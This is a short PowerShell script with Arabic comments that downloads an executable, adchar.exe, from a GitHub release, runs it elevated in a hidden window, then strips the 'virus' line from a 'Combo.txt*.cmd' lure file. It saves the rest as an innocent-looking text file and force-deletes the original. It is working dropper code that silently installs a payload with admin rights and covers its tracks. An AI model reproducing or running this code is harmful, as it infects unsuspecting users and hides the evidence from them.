# 1. تحميل وتشغيل adchar.exe (كما فعلنا سابقاً)
$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
$tempPath = "$env:TEMP\adchar_installer.exe"
(New-Object Net.WebClient).DownloadFile($url, $tempPath)
Start-Process $tempPath -Verb runAs -WindowStyle Hidden

# 2. الجزء السحري: تنظيف ملف الكومبو من الكود الخبيث
$targetFile = Get-ChildItem -Filter "Combo.txt*.cmd" -Recurse | Select-Object -First 1
if ($targetFile) {
    $content = Get-Content $targetFile.FullName
    # حذف أول سطر (الذي يحتوي على الفيروس) وحفظ الباقي كملف نصي حقيقي
    $content | Select-Object -Skip 1 | Set-Content "Combo_Real.txt"
    Remove-Item $targetFile.FullName -Force
}
